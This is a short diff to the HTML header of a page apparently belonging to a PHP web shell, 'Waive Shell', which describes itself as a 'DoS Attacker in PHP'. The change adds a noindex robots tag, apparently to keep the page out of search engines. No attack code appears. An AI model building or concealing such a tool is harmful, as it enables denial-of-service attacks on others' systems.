@@ -5,6 +5,7 @@
     <meta name="WaiveShell3.0" content="DoS Attacker in PHP">
     <meta name="author" content="waived">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex">
     <title>:: Waive Shell ::</title>
     <style>
       body {
